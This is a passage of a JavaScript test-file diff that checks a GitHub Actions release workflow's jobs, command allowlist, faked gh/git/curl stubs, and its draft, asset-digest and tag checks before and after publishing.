+function releaseStep(id, text) {
+  const steps = releaseStepsOf(id).filter((step) => scriptOf(step).includes(text));
+  assert.equal(steps.length, 1, `release.yml's job ${id} must have one step that runs ${text}`);
+  return steps[0];
+}
+
+/** The actions each job with the Release Bot's key may run (another test checks each is pinned to a commit). */
+const RELEASE_BOT_ACTIONS = {
+  "release-please": ["actions/create-github-app-token", "googleapis/release-please-action"],
+  assemble: ["actions/attest-build-provenance", "actions/checkout", "actions/create-github-app-token", "actions/download-artifact", "actions/setup-node", "actions/upload-artifact"],
+  publish: ["actions/create-github-app-token"],
+};
+
+/**
+ * A rule for gh's arguments in those jobs: gh release view reads a release
+ * of the repository GH_REPO names; one gh api call lists the repository's
+ * releases, to count the drafts; the two writes are the workflow's own. Each
+ * but gh release view takes its one form. The token can write the
+ * repository's contents, so nothing else, such as gh release delete or
+ * another gh api call, may run.
+ */
+function ghRule(args) {
+  if (args[0] === "release" && args[1] === "view") {
+    return args.some((arg) => /^(-R|--repo)(=|$)/.test(arg)) ? "must take the repository from GH_REPO" : null;
+  }
+  const forms = [
+    ["api", "repos/$GITHUB_REPOSITORY/releases?per_page=100", "--jq", "map(select(.draft)) | length"],
+    ["release", "upload", "$TAG", "release/*", "--clobber"],
+    ["release", "edit", "$TAG", "--draft=false", "--latest"],
+  ];
+  if (forms.some((form) => sameWords(form, args))) return null;
+  return `may only view a release, or run ${forms.map((form) => `gh ${form.join(" ")}`).join(" or ")}`;
+}
+
+/** The commands those jobs may run, besides node on the release scripts, each with a rule for its arguments. */
+const RELEASE_BOT_TOOLS = new Map([
+  ["[", anything],
+  ["curl", exactly(["-fsSL", "$url"])],
+  ["echo", anything],
+  ["exit", anything],
+  ["gh", ghRule],
+  ["git", exactly(["ls-remote", "--tags", "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY", "refs/tags/$TAG"])],
+  ["jq", exactly(["-r", ".version"])],
+  ["printf", printfRule],
+  // Reading its input: a file it names would be one of the folder the step is
+  // in, and these jobs may not change folders, as this check doesn't follow
+  // the folder a command runs in.
+  ["sha256sum", exactly([])],
+  ["sleep", exactly(["10"])],
+  ["sort", exactly([])],
+]);
+
+/**
+ * Why a simple command may not run in a job with the Release Bot's key: none,
+ * when it may. Only node on a scripts/release/*.mjs file and the tools above
+ * may run, with the arguments their rules allow, and settingProblems' rules
+ * hold, with LC_ALL the one upper-case name a command may set.
+ *
+ * @param {{ words: string[], assignments: { name: string }[], redirects: { op: string, target: string }[] }} command
+ * @returns {string[]}
+ */
+function releaseBotProblems({ words: [name, ...args], assignments, redirects }) {
+  const problems = settingProblems(assignments, redirects, ["LC_ALL"]);
+  if (name === undefined) return problems;
+  let why = null;
+  if (name === "node") {
+    if (!/^scripts\/release\/[\w-]+\.mjs$/.test(args[0] ?? "")) why = "runs node on something other than a scripts/release/*.mjs file";
+  } else if (/[/$`]/.test(name)) why = "runs a file by its path, or a command named by a variable";
+  else if (!RELEASE_BOT_TOOLS.has(name)) why = `runs ${name}, which isn't among the commands these jobs may run`;
+  else {
+    const rule = RELEASE_BOT_TOOLS.get(name)(args);
+    if (rule !== null) why = `runs ${name}, which ${rule}`;
+  }
+  if (why !== null) problems.push(why);
+  return problems;
+}
+
+const JQ_SKIP = spawnSync("jq", ["--version"], { stdio: "ignore" }).status === 0 ? false : "jq is needed: release.yml's publish job reads latest.json with it, and the stand-in gh answers --jq with it";
+
+const SHA256SUM_SKIP =
+  spawnSync("sha256sum", ["--version"], { stdio: "ignore" }).status === 0 ? false : "sha256sum is needed: release.yml's assemble job hashes SHA256SUMS with it";
+
+/** A test that parses YAML and runs a step's script with jq at hand, skipped (with the reason) where any of them is missing. */
+const jqScriptTest = (name, fn) => test(name, { skip: YAML_SKIP || BASH_SKIP || JQ_SKIP }, fn);
+
+/**
+ * gh, as the tests of release.yml's steps fake it. It logs its arguments.
+ * gh release view answers with jq, as its --jq does, from a JSON file: the
+ * release STUB_TAG names, from STUB_RELEASE, or with no tag, the latest
+ * release, from STUB_LATEST. gh api answers the repository's release list,
+ * STUB_RELEASES, the same way, and fails, as on an error status, without
+ * one. gh release upload and edit only log. Another release, endpoint or
+ * command fails.
+ */
+const FAKE_GH = [
+  "#!/bin/sh",
+  "printf '%s\\n' \"$*\" >> \"$STUB_LOG.gh\"",
+  'if [ "$1" = api ]; then',
+  '  [ "$2" = "repos/$GITHUB_REPOSITORY/releases?per_page=100" ] && [ "$3" = --jq ] || exit 3',
+  '  [ -f "$STUB_RELEASES" ] || { echo "gh: Server Error (HTTP 502)" >&2; exit 1; }',
+  '  exec jq -r "$4" "$STUB_RELEASES"',
+  "fi",
+  '[ "$1" = release ] || exit 3',
+  "sub=$2",
+  "shift 2",
+  "case $sub in",
+  "  view)",
+  "    file=$STUB_LATEST",
+  "    case $1 in",
+  "      -*) ;;",
+  '      *) [ "$1" = "$STUB_TAG" ] || { echo "release not found" >&2; exit 1; }; file=$STUB_RELEASE; shift ;;',
+  "    esac",
+  "    expr=",
+  "    while [ $# -gt 0 ]; do",
+  '      case $1 in --json) shift 2 ;; --jq) expr=$2; shift 2 ;; *) echo "unexpected $1" >&2; exit 3 ;; esac',
+  "    done",
+  '    jq -r "$expr" "$file" ;;',
+  "  upload | edit)",
+  '    [ "$1" = "$STUB_TAG" ] || { echo "release not found" >&2; exit 1; } ;;',
+  "  *) exit 3 ;;",
+  "esac",
+  "",
+].join("\n");
+
+/** git, faked: it logs its arguments, and git ls-remote prints STUB_LS_REMOTE, a line or nothing. */
+const FAKE_GIT = [
+  "#!/bin/sh",
+  "printf '%s\\n' \"$*\" >> \"$STUB_LOG.git\"",
+  '[ "$1" = ls-remote ] || exit 3',
+  "if [ -n \"$STUB_LS_REMOTE\" ]; then printf '%s\\n' \"$STUB_LS_REMOTE\"; fi",
+  "",
+].join("\n");
+
+/**
+ * curl, faked: it logs its arguments, and its nth call prints STUB_SERVED/n,
+ * or STUB_SERVED/last once there is no such file; a file that says
+ * "HTTP 404" fails as curl -f fails on that status.
+ */
+const FAKE_CURL = [
+  "#!/bin/sh",
+  "printf '%s\\n' \"$*\" >> \"$STUB_LOG.curl\"",
+  'n=$(wc -l < "$STUB_LOG.curl" | tr -d " ")',
+  'file="$STUB_SERVED/$n"',
+  '[ -f "$file" ] || file="$STUB_SERVED/last"',
+  'if [ "$(cat "$file")" = "HTTP 404" ]; then echo "curl: (22) The requested URL returned error: 404" >&2; exit 22; fi',
+  'cat "$file"',
+  "",
+].join("\n");
+
+/** sleep, faked: it logs its argument and returns at once. */
+const FAKE_SLEEP = "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"$STUB_LOG.sleep\"\n";
+
+/**
+ * Run a step of release.yml as the runner runs it (bash -eo pipefail), with
+ * `env`, in a temporary folder that holds scripts/release/release-assets.mjs
+ * and a release/ folder with `files`, each holding its name and a newline,
+ * or what `contents` gives for it. node, jq and sha256sum are the real ones;
+ * gh, git, curl and sleep are FAKE_GH, FAKE_GIT, FAKE_CURL and FAKE_SLEEP.
+ * `release` and `latest` are what gh release view shows of the release `tag`
+ * names and of the latest release, and `releases`, the list gh api gives;
+ * `served` holds what curl's calls print in turn, a null for a 404. Returns
+ * { status, output, gh, git, curl, sleep, outputs }: the lines each stand-in
+ * logged, and what the step wrote to GITHUB_OUTPUT.
+ */
+function runReleaseStep(step, { env = {}, files = [], contents = {}, release, latest, releases, tag = "v1.2.3", served = [] } = {}) {
+  return inTempDir((dir) => {
+    const bin = join(dir, "bin");
+    for (const sub of ["bin", "release", "served", "scripts/release"]) mkdirSync(join(dir, sub), { recursive: true });
+    copyFileSync(join(ROOT, "scripts/release/release-assets.mjs"), join(dir, "scripts/release/release-assets.mjs"));
+    for (const name of files) writeFileSync(join(dir, "release", name), contents[name] ?? `${name}\n`);
+    for (const [name, value] of [["release.json", release], ["latest-release.json", latest], ["releases.json", releases]]) {
+      if (value !== undefined) writeFileSync(join(dir, name), JSON.stringify(value));
+    }
+    writeFileSync(join(dir, "github-output"), "");
+    served.forEach((body, i) => writeFileSync(join(dir, "served", String(i + 1)), body ?? "HTTP 404"));
+    if (served.length > 0) writeFileSync(join(dir, "served", "last"), served.at(-1) ?? "HTTP 404");
+    for (const [name, text] of [
+      ["gh", FAKE_GH],
+      ["git", FAKE_GIT],
+      ["curl", FAKE_CURL],
+      ["sleep", FAKE_SLEEP],
+      ["node", `#!/bin/sh\nexec "${process.execPath}" "$@"\n`],
+    ]) {
+      writeFileSync(join(bin, name), text, { mode: 0o755 });
+    }
+    const log = join(dir, "stub");
+    const result = spawnSync("bash", ["--noprofile", "--norc", "-eo", "pipefail", "-c", step.run], {
+      cwd: dir,
+      env: {
+        PATH: `${bin}:${process.env.PATH}`,
+        HOME: process.env.HOME,
+        STUB_LOG: log,
+        STUB_TAG: tag,
+        STUB_RELEASE: join(dir, "release.json"),
+        STUB_LATEST: join(dir, "latest-release.json"),
+        STUB_RELEASES: join(dir, "releases.json"),
+        STUB_SERVED: join(dir, "served"),
+        GH_TOKEN: "the Release Bot's token",
+        GH_REPO: "fleetifydev/fleetify",
+        GITHUB_OUTPUT: join(dir, "github-output"),
+        ...env,
+      },
+      encoding: "utf8",
+      timeout: 60_000,
+    });
+    const logged = (name) => (existsSync(`${log}.${name}`) ? readFileSync(`${log}.${name}`, "utf8").split("\n").filter(Boolean) : []);
+    return {
+      status: result.status,
+      output: `${result.stdout}${result.stderr}`,
+      gh: logged("gh"),
+      git: logged("git"),
+      curl: logged("curl"),
+      sleep: logged("sleep"),
+      outputs: readFileSync(join(dir, "github-output"), "utf8"),
+    };
+  });
+}
+
+/** A commit id, as release-please's sha output gives the draft's. */
+const DRAFT_COMMIT = "0123456789abcdef0123456789abcdef01234567";
+
+/** What each of release.yml's step tests runs with: the draft of version 1.2.3, at DRAFT_COMMIT. */
+const RELEASE_ENV = {
+  TAG: "v1.2.3",
+  VERSION: "1.2.3",
+  SHA: DRAFT_COMMIT,
+  GITHUB_SERVER_URL: "https://github.com",
+  GITHUB_REPOSITORY: "fleetifydev/fleetify",
+};
+
+describe("release.yml", () => {
+  yamlTest("it runs on pushes to main alone, one run at a time, none cancelled, in five jobs, with bash", () => {
+    const flow = workflow(RELEASE);
+    assert.deepEqual(triggersOf(flow), { push: { branches: ["main"] } });
+    // A run waits for the one before it to end, so release-please never runs
+    // while a release run is still going, and a release that started is never
+    // cut short. A draft that a failed or cancelled run left behind is for the
+    // draft check to find.
+    assert.deepEqual(flow.concurrency, { group: "release", "cancel-in-progress": false });
+    assert.deepEqual(Object.keys(flow.jobs ?? {}).sort(), ["assemble", "build", "publish", "release-please", "smoke"]);
+    // bash -eo pipefail: a pipe whose first command fails, fails.
+    assert.equal(flow.defaults?.run?.shell, "bash", "release.yml's steps must run with bash");
+  });
+
+  yamlTest("release-please runs twice with the Release Bot's token, the release alone, then the release pull request alone, and hands on the release's tag, version and commit", () => {
+    // In one step, the action goes on from a release it has just made to the
+    // release pull request, which it would then work out from a history in
+    // which the new draft, with no tag yet, isn't the last release. Events
+    // made with the App's token start workflows, unlike the job's own
+    // token's, so the release pull request gets its checks.
+    const job = jobOf(RELEASE, "release-please");
+    assert.equal(job["runs-on"], "ubuntu-24.04");
+    const steps = releaseStepsOf("release-please");
+    const [token] = tokenStepsOf("release-please");
+    const runs = steps.filter((step) => usesAction(step, "googleapis/release-please-action"));
+    assert.equal(runs.length, 2, "release-please must run release-please-action twice: for the release, then for the release pull request");
+    const [release, pullRequest] = runs;
+    assert.ok(token !== undefined && steps.indexOf(token) < steps.indexOf(release), "release-please must make the Release Bot's token before it runs release-please");
+    assert.equal(release.id, "release", "the job's outputs and the steps after it read the release step's outputs, as steps.release");
+    assert.equal(release.if, undefined, "the release step must run on every push");
+    const inputs = { token: `\${{ steps.${token.id}.outputs.token }}`, "config-file": "release-please-config.json", "manifest-file": ".release-please-manifest.json" };
+    assert.deepEqual(release.with, { ...inputs, "skip-github-pull-request": true });
+    assert.deepEqual(pullRequest.with, { ...inputs, "skip-github-release": true });
+    for (const file of [inputs["config-file"], inputs["manifest-file"]]) assert.ok(existsSync(join(ROOT, file)), `${file} is missing`);
+    assert.deepEqual(job.outputs, Object.fromEntries(["release_created", "tag_name", "version", "sha"].map((name) => [name, `\${{ steps.release.outputs.${name} }}`])));
+  });
+
+  yamlTest("the release pull request is made only in a run that made no release, once the step before it has found no draft pending", () => {
+    // A draft has no tag, so release-please can't see it as the last release.
+    const steps = releaseStepsOf("release-please");
+    const [release, pullRequest] = steps.filter((step) => usesAction(step, "googleapis/release-please-action"));
+    const looks = steps.filter((step) => scriptOf(step).includes("gh api"));
+    assert.equal(looks.length, 1, "release-please must look for a pending draft once");
+    const [look] = looks;
+    assert.equal(look.id, "drafts");
+    const condition = (step) => String(step.if).replace(/\s+/g, " ").trim();
+    assert.equal(condition(look), "steps.release.outputs.release_created != 'true'");
+    assert.ok(steps.indexOf(release) < steps.indexOf(look) && steps.indexOf(look) < steps.indexOf(pullRequest), "release-please must look for a draft after the release step and before the pull request step");
+    // Only the answer that there is none lets it run: no answer, as when the
+    // check is skipped, leaves it out.
+    assert.equal(condition(pullRequest), "steps.release.outputs.release_created != 'true' && steps.drafts.outputs.pending == 'false'");
+  });
+
+  jqScriptTest("the draft check answers pending=false only when GitHub lists no draft release, warns when one is pending, and fails when GitHub doesn't answer", () => {
+    const look = releaseStepsOf("release-please").find((step) => step.id === "drafts");
+    const release = (tag_name, draft) => ({ tag_name, draft });
+    for (const releases of [[], [release("v1.2.2", false), release("v1.2.1", false)]]) {
+      const none = runReleaseStep(look, { env: RELEASE_ENV, releases });
+      assert.equal(none.status, 0, none.output);
+      assert.equal(none.outputs, "pending=false\n", JSON.stringify(releases));
+      assert.doesNotMatch(none.output, /::warning::/);
+      assert.deepEqual(none.gh, ["api repos/fleetifydev/fleetify/releases?per_page=100 --jq map(select(.draft)) | length"]);
+    }
+    const pending = runReleaseStep(look, { env: RELEASE_ENV, releases: [release("v1.2.3", true), release("v1.2.2", false)] });
+    assert.equal(pending.status, 0, pending.output);
+    assert.equal(pending.outputs, "pending=true\n");
+    assert.match(pending.output, /::warning::a draft release is pending: see "If a run fails" in docs\/RELEASE\.md\. The release pull request waits until it is published or deleted\./);
+    const unanswered = runReleaseStep(look, { env: RELEASE_ENV });
+    assert.notEqual(unanswered.status, 0, unanswered.output);
+    assert.equal(unanswered.outputs, "", "the check gave an answer it didn't get");
+  });
+
+  scriptTest("release-please's check passes a draft tagged v<version> at a commit, and fails another tag, or anything but a commit", () => {
+    // latest.json's download URLs look for the files under v<version>, and
+    // build.yml checks out the commit, where a branch could move on before
+    // the tag is made.
+    const steps = releaseStepsOf("release-please");
+    const run = steps.find((step) => step.id === "release");
+    const checks = steps.filter((step) => scriptOf(step).includes('"v$VERSION"'));
+    assert.equal(checks.length, 1, "release-please must check what release-please made, once");
+    const [check] = checks;
+    assert.ok(steps.indexOf(check) > steps.indexOf(run));
+    assert.equal(String(check.if).replace(/\s+/g, " ").trim(), "steps.release.outputs.release_created == 'true'");
+    assert.deepEqual(check.env, Object.fromEntries([["TAG", "tag_name"], ["VERSION", "version"], ["SHA", "sha"]].map(([name, output]) => [name, `\${{ steps.release.outputs.${output} }}`])));
+    inTempDir((dir) => {
+      const status = (env) => runScript(check.run, { cwd: dir, env }).status;
+      assert.equal(status({ TAG: "v1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT }), 0);
+      for (const env of [
+        { TAG: "1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT },
+        { TAG: "fleetify-v1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT },
+        { TAG: "v1.2.4", VERSION: "1.2.3", SHA: DRAFT_COMMIT },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: "main" },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: "" },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT.slice(0, 39) },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: `${DRAFT_COMMIT}0` },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: DRAFT_COMMIT.toUpperCase() },
+        { TAG: "v1.2.3", VERSION: "1.2.3", SHA: `${DRAFT_COMMIT.slice(0, 39)}g` },
+      ]) {
+        assert.equal(status(env), 1, JSON.stringify(env));
+      }
+    });
+  });
+
+  yamlTest("build runs build.yml on the draft's commit, whose tag doesn't exist yet, in the release environment, once release-please has made a release", () => {
+    const build = jobOf(RELEASE, "build");
+    assert.equal(build.uses, "./.github/workflows/build.yml");
+    assert.deepEqual([build.needs].flat(), ["release-please"]);
+    assert.equal(String(build.if).replace(/\s+/g, " ").trim(), "needs.release-please.outputs.release_created == 'true'");
+    assert.deepEqual(build.with, { ref: fromReleasePlease("sha"), environment: "release", version: fromReleasePlease("version") });
+  });
+
+  yamlTest("no job but build has a condition of its own, so each runs only once every job it needs has passed", () => {
+    // A job's own condition takes the place of the success() GitHub puts in
+    // front of it: with if: ${{ !cancelled() }}, publish would publish after
+    // a failed smoke.
+    const conditions = Object.fromEntries(Object.entries(workflow(RELEASE).jobs ?? {}).map(([id, job]) => [id, job.if === undefined ? undefined : String(job.if).replace(/\s+/g, " ").trim()]));
+    assert.deepEqual(conditions, {
+      "release-please": undefined,
+      build: "needs.release-please.outputs.release_created == 'true'",
+      assemble: undefined,
+      smoke: undefined,
+      publish: undefined,
+    });
+  });
+
+  yamlTest("assemble checks every signature against the shipped release key, with the release scripts of the draft's commit", () => {
+    const job = jobOf(RELEASE, "assemble");
+    assert.deepEqual([job.needs].flat().sort(), ["build", "release-please"]);
+    assert.equal(job["runs-on"], "ubuntu-24.04");
+    assert.deepEqual(job.env, { TAG: fromReleasePlease("tag_name"), VERSION: fromReleasePlease("version"), GH_REPO: "${{ github.repository }}" });
+    const checkouts = releaseStepsOf("assemble").filter((step) => usesAction(step, "actions/checkout"));
+    assert.equal(checkouts.length, 1, "assemble must check out once");
+    assert.deepEqual(checkouts[0].with, {
+      ref: fromReleasePlease("sha"),
+      "sparse-checkout": ".nvmrc\nscripts/release\nsrc-tauri/tauri.conf.json\n",
+      "sparse-checkout-cone-mode": false,
+      "persist-credentials": false,
+    });
+    const step = releaseStep("assemble", "assemble.mjs");
+    assert.equal(step.if, undefined);
+    assert.match(scriptOf(step), new RegExp(`^node scripts/release/assemble\\.mjs --in artifacts --out release --version "\\$VERSION" --pubkey-config src-tauri/tauri\\.conf\\.json --expect-key-id ${UPDATER_KEY_ID}\\s`));
+    assert.doesNotMatch(scriptOf(step), /--per-target-pubkeys/);
+  });
+
+  yamlTest("assemble downloads and assembles before any token exists, attests, then makes the token, uploads to the draft, checks it, and hands the release to the smoke", () => {
+    const steps = releaseStepsOf("assemble");
+    const at = (found) => steps.findIndex(found);
+    const order = [
+      at((step) => usesAction(step, "actions/download-artifact")),
+      at((step) => scriptOf(step).includes("assemble.mjs")),
+      at((step) => usesAction(step, "actions/attest-build-provenance")),
+      at((step) => usesAction(step, "actions/create-github-app-token")),
+      at((step) => scriptOf(step).includes("gh release upload")),
+      at((step) => scriptOf(step).includes("release-assets.mjs expected")),
+      at((step) => usesAction(step, "actions/upload-artifact")),
+    ];
+    assert.ok(order.every((i, n) => i !== -1 && (n === 0 || i > order[n - 1])), `assemble's steps are out of order: ${order.join(", ")}`);
+    assert.equal(order.at(-1), steps.length - 1, "the release is handed to the smoke last");
+  });
+
+  yamlTest("the build provenance is attested in a job of release.yml itself, the only attestation of any workflow", () => {
+    // An attestation names the workflow whose job made it as its signer. Made
+    // in a workflow release.yml calls, it would name that one, and gh
+    // attestation verify --signer-workflow …/release.yml would refuse it.
+    const attests = workflowJobs().flatMap(({ rel, id, job }) =>
+      (job.steps ?? []).filter((step) => /^actions\/attest(-build-provenance)?@/.test(String(step.uses ?? ""))).map((step) => ({ rel, id, step })),
+    );
+    assert.deepEqual(attests.map(({ rel, id }) => `${rel}, job ${id}`), [`${RELEASE}, job assemble`]);
+    const [{ step }] = attests;
+    assert.ok(usesAction(step, "actions/attest-build-provenance"));
+    assert.deepEqual(step.with, { "subject-path": "release/*" });
+    const job = jobOf(RELEASE, "assemble");
+    assert.equal(job.uses, undefined, "assemble must be a job of release.yml, not a call of another workflow");
+    assert.deepEqual(job.permissions, { contents: "read", "id-token": "write", attestations: "write" });
+    for (const [id, other] of Object.entries(workflow(RELEASE).jobs ?? {})) {
+      if (id !== "assemble") assert.equal(other.permissions, undefined, `job ${id} widens its permissions`);
+    }
+  });
+
+  scriptTest("assemble uploads the assembled files to the draft, and to nothing but a draft", () => {
+    // A published release's files are public: they stay as they are.
+    const step = releaseStep("assemble", "gh release upload");
+    const files = expectedAssets("1.2.3");
+    const run = (isDraft) => runReleaseStep(step, { env: RELEASE_ENV, files, release: { tagName: "v1.2.3", isDraft, assets: [] } });
+    const draft = run(true);
+    assert.equal(draft.status, 0, draft.output);
+    assert.equal(draft.gh.length, 2, draft.gh.join("\n"));
+    assert.equal(draft.gh[0], "release view v1.2.3 --json isDraft --jq .isDraft");
+    const uploaded = draft.gh[1].split(" ");
+    assert.deepEqual([...uploaded.slice(0, 3), uploaded.at(-1)], ["release", "upload", "v1.2.3", "--clobber"]);
+    assert.deepEqual(uploaded.slice(3, -1).sort(), files.map((name) => `release/${name}`).sort());
+    const published = run(false);
+    assert.equal(published.status, 1, published.output);
+    assert.match(published.output, /::error::v1\.2\.3 is published already/);
+    assert.deepEqual(published.gh, ["release view v1.2.3 --json isDraft --jq .isDraft"]);
+  });
+
+  test("assemble's check passes a draft that holds exactly expectedAssets(), each uploaded in full with the bytes assembled, and fails one with an asset missing, extra, cut short or of other bytes", { skip: YAML_SKIP || BASH_SKIP || JQ_SKIP || SHA256SUM_SKIP }, () => {
+    const step = releaseStep("assemble", "release-assets.mjs expected");
+    const expected = expectedAssets("1.2.3");
+    const sha256 = (text) => createHash("sha256").update(text).digest("hex");
+    // Each assembled file holds its name, and SHA256SUMS lists every other
+    // one's SHA-256, as assemble.mjs writes it.
+    const sums = expected
+      .filter((name) => name !== "SHA256SUMS")
+      .map((name) => `${sha256(`${name}\n`)}  ${name}\n`)
+      .join("");
+    /** A draft's asset, with the SHA-256 of the bytes it holds, as gh shows it. */
+    const asset = (name, { state = "uploaded", bytes = name === "SHA256SUMS" ? sums : `${name}\n`, digest = `sha256:${sha256(bytes)}` } = {}) => ({ name, state, digest, size: 1 });
+    const check = (assets, listed = sums) =>
+      runReleaseStep(step, { env: RELEASE_ENV, files: expected, contents: { SHA256SUMS: listed }, release: { tagName: "v1.2.3", isDraft: true, assets } });
+    // In whatever order GitHub lists them.
+    const good = check([...expected].reverse().map((name) => asset(name)));
+    assert.equal(good.status, 0, good.output);
+    for (const [why, assets] of [
+      ["one missing", expected.slice(1).map((name) => asset(name))],
+      ["one more", [...expected, "Fleetify_1.2.2_x64-setup.exe"].map((name) => asset(name))],
+      ["one still uploading", expected.map((name, i) => asset(name, { state: i === 0 ? "open" : "uploaded" }))],
+      ["another version's", expectedAssets("1.2.2").map((name) => asset(name))],
+      ["none", []],
+    ]) {
+      const result = check(assets);
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+      assert.match(result.output, /::error::the draft v1\.2\.3 doesn't hold exactly the release's assets/, why);
+    }
+    const other = (target, change) => expected.map((name) => asset(name, name === target ? change : {}));
+    const misListed = sums.replace(sha256("latest.json\n"), sha256("another latest.json\n"));
+    for (const [why, assets, listed] of [
+      ["an asset of other bytes", other("latest.json", { bytes: "another latest.json\n" })],
+      ["SHA256SUMS of other bytes", other("SHA256SUMS", { bytes: "another SHA256SUMS\n" })],
+      ["an asset without a SHA-256", other("install.sh", { digest: null })],
+      ["a SHA-512 in place of the SHA-256", other("install.ps1", { digest: `sha512:${sha256("install.ps1\n")}` })],
+      // The SHA256SUMS uploaded is the one assembled, but what it lists isn't what was uploaded.
+      ["a SHA256SUMS that lists other bytes", other("SHA256SUMS", { bytes: misListed }), misListed],
+    ]) {
+      const result = check(assets, listed);
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+      assert.match(result.output, /::error::the draft v1\.2\.3's assets aren't the bytes that were assembled/, why);
+    }
+  });
+
+  yamlTest("smoke runs smoke.yml on the assembled release, with no update to rehearse, against the pinned designated requirement, with the draft's commit's release scripts", () => {
+    // A release build's updater asks only the shipped endpoints. The draft's
+    // commit, which the build checked out, needn't be the commit the run is
+    // on: a later push's run makes the release of a release pull request
+    // whose own run didn't.
+    const smoke = jobOf(RELEASE, "smoke");
+    assert.equal(smoke.uses, "./.github/workflows/smoke.yml");
+    assert.deepEqual([smoke.needs].flat().sort(), ["assemble", "release-please"]);
+    assert.deepEqual(smoke.with, { version: fromReleasePlease("version"), rehearse: false, "expected-dr": DR_FILE, ref: fromReleasePlease("sha") });
+    assert.ok(existsSync(join(ROOT, DR_FILE)), `${DR_FILE} is missing`);
+  });
+
+  yamlTest("publish waits for assemble and smoke, then publishes the draft as the latest release, and checks it", () => {
+    const job = jobOf(RELEASE, "publish");
+    const needs = [job.needs].flat();
+    assert.deepEqual(["release-please", "assemble", "smoke"].filter((need) => !needs.includes(need)), [], "publish must need release-please, assemble and smoke");
+    assert.equal(job["runs-on"], "ubuntu-24.04");
+    assert.deepEqual(job.env, { TAG: fromReleasePlease("tag_name"), VERSION: fromReleasePlease("version"), SHA: fromReleasePlease("sha"), GH_REPO: "${{ github.repository }}" });
+    const steps = releaseStepsOf("publish");
+    const publish = releaseStep("publish", "gh release edit");
+    // Publishing the draft makes its tag, as the Release Bot.
+    assert.deepEqual(commandLines(publish), ['gh release edit "$TAG" --draft=false --latest']);
+    // A tag is permanent, so the draft's commit and the tag's absence are
+    // checked before; what publishing did, after.
+    const before = steps.slice(0, steps.indexOf(publish)).map(scriptOf).join("\n");
+    for (const text of ['gh release view "$TAG" --json targetCommitish', 'git ls-remote --tags "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY" "refs/tags/$TAG"']) {
+      assert.ok(before.includes(text), `publish doesn't check, before it publishes: ${text}`);
+    }
+    const after = steps.slice(steps.indexOf(publish) + 1).map(scriptOf).join("\n");
+    for (const text of ['gh release view "$TAG" --json isDraft,tagName', "gh release view --json tagName", "git ls-remote --tags", "curl -fsSL"]) {
+      assert.ok(after.includes(text), `publish doesn't check, once it has published: ${text}`);
+    }
+  });
+
+  jqScriptTest("publish checks, before it publishes, that the draft points at the commit that was built, and that its tag doesn't exist yet", () => {
+    // Publishing makes the tag at the draft's commit, unless the tag exists
+    // already: then the release keeps it, wherever it points, for good.
+    const target = releaseStep("publish", "--json targetCommitish");
+    const draft = (targetCommitish) => ({ tagName: "v1.2.3", isDraft: true, targetCommitish, assets: [] });
+    const good = runReleaseStep(target, { env: RELEASE_ENV, release: draft(DRAFT_COMMIT) });
+    assert.equal(good.status, 0, good.output);
+    assert.deepEqual(good.gh, ["release view v1.2.3 --json targetCommitish --jq .targetCommitish"]);
+    for (const [why, options] of [
+      ["another commit", { release: draft("f".repeat(40)) }],
+      ["a branch", { release: draft("main") }],
+      ["no such draft", { release: draft(DRAFT_COMMIT), tag: "v9.9.9" }],
+    ]) {
+      const result = runReleaseStep(target, { env: RELEASE_ENV, ...options });
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+    }
+    assert.match(runReleaseStep(target, { env: RELEASE_ENV, release: draft("main") }).output, /::error::the draft v1\.2\.3 points at main, not at 0123456789abcdef0123456789abcdef01234567/);
+
+    const absent = releaseStep("publish", '[ -n "$tag" ]');
+    const untagged = runReleaseStep(absent, { env: { ...RELEASE_ENV, STUB_LS_REMOTE: "" } });
+    assert.equal(untagged.status, 0, untagged.output);
+    assert.deepEqual(untagged.git, ["ls-remote --tags https://github.com/fleetifydev/fleetify refs/tags/v1.2.3"]);
+    // Even at the right commit: then this release was published before, and
+    // its tag exists for good.
+    for (const commit of [DRAFT_COMMIT, "f".repeat(40)]) {
+      const result = runReleaseStep(absent, { env: { ...RELEASE_ENV, STUB_LS_REMOTE: `${commit}\trefs/tags/v1.2.3` } });
+      assert.equal(result.status, 1, `a tag at ${commit}:\n${result.output}`);
+      assert.match(result.output, /::error::the tag v1\.2\.3 exists already/);
+    }
+
+    const steps = releaseStepsOf("publish");
+    const order = [tokenStepsOf("publish")[0], target, absent, releaseStep("publish", "gh release edit")].map((step) => steps.indexOf(step));
+    assert.ok(order.every((at, n) => at !== -1 && (n === 0 || at > order[n - 1])), `publish must make its token, check the draft's commit, check that the tag doesn't exist, then publish: ${order.join(", ")}`);
+  });
+
+  yamlTest("publish checks the latest.json that installed copies ask GitHub for: tauri.conf.json's second update endpoint", () => {
+    const step = releaseStep("publish", "curl -fsSL");
+    const urls = simpleCommands(scriptOf(step)).flatMap(({ assignments }) => assignments).filter(({ name }) => name === "url").map(({ value }) => value);
+    const endpoints = JSON.parse(read("src-tauri/tauri.conf.json")).plugins.updater.endpoints;
+    assert.equal(endpoints.length, 2, "tauri.conf.json's updater has two endpoints: fleetify.dev's, then GitHub's");
+    assert.deepEqual(urls, [endpoints[1]]);
+  });
+
+  jqScriptTest("publish's checks pass a published, latest release, tagged at the draft's commit, whose latest.json names its version, and fail anything else", () => {
+    const published = releaseStep("publish", "--json isDraft,tagName");
+    const release = (isDraft) => ({ tagName: "v1.2.3", isDraft, assets: [] });
+    const latest = (tagName) => ({ tagName, isDraft: false, assets: [] });
+    const good = runReleaseStep(published, { env: RELEASE_ENV, release: release(false), latest: latest("v1.2.3") });
+    assert.equal(good.status, 0, good.output);
+    // Each case breaks one check alone.
+    for (const [why, options] of [
+      ["still a draft", { release: release(true), latest: latest("v1.2.3") }],
+      ["not the latest", { release: release(false), latest: latest("v1.2.2") }],
